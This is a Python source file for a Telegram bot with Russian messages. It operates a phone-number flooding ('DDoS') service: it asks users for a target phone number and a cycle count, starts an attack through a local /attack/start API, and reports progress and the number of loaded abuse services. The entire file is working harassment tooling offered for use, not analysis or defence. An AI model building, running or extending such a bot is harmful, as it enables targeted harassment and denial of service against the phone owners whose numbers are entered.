import telebot
import requests

bot = telebot.TeleBot('TOKEN')

user_dict = {}

class User:
    def __init__(self, tel):
        self.tel = tel
        self.count = None
        self.id = None

bot.send_message(201743325, "Готов к разъёбу")

@bot.message_handler(commands=['info'])
def startSS(message):
    print(user_dict)


@bot.message_handler(commands=['start'])
def start(message):

    bot.send_message(message.from_user.id, "Номер для дудоса")
    bot.register_next_step_handler(message, get_tel)

def get_tel(message):
    chat_id = message.chat.id
    tel = message.text
    user = User(tel)
    user_dict[chat_id] = user
    bot.send_message(message.from_user.id, 'Количество циклов')
    bot.register_next_step_handler(message, get_count)


def get_count(message):
    chat_id = message.chat.id
    count = message.text
    user = user_dict[chat_id]
    user.count = count
    bot.send_message(message.from_user.id, ''+user.count+' циклов на номер '+user.tel+' ')
    try:
        response = requests.post(
            "http://127.0.0.1:8080/attack/start",
            json={"number_of_cycles": user.count, "phone": user.tel},
        ).json()
        if response["success"]:
            user.id = response["id"]  # 94bf6f8f0da04a73bc229b09ba6eec98
            bot.send_message(message.from_user.id, 'В процессе. Статус по текущей можно отследить тут /status')
        else:
            bot.send_message(message.from_user.id, 'Что-то пошло не так, попробуйте снова')
    except BaseException:
        bot.send_message(message.from_user.id, f"Что-то пошло не так, попробуйте снова")

@bot.message_handler(commands=['status'])
def status(message):
    try:
        chat_id = message.chat.id
        user = user_dict[chat_id]
        response = requests.get(
            f"http://127.0.0.1:8080/attack/{user.id}/status", params={"country_code": 7}
        ).json()
        # print(f"{response['currently_at']}/{response['end_at']}")
        bot.send_message(message.from_user.id, f"{response['currently_at']}/{response['end_at']}")
    except BaseException:
        bot.send_message(message.from_user.id, f"Упал сервер или не было последней записи")

@bot.message_handler(commands=['status_server'])
def statusServer(message):
    try:
        response = requests.get(
            "http://127.0.0.1:8080/services/count", params={"country_code": 7}
        ).json()
        bot.send_message(message.from_user.id, "Сервер готов. Заряжено "+str(response["count"])+" сервисов")
    except BaseException:
            bot.send_message(message.from_user.id, f"Сервак лежит")

bot.polling(none_stop=True, interval=0)
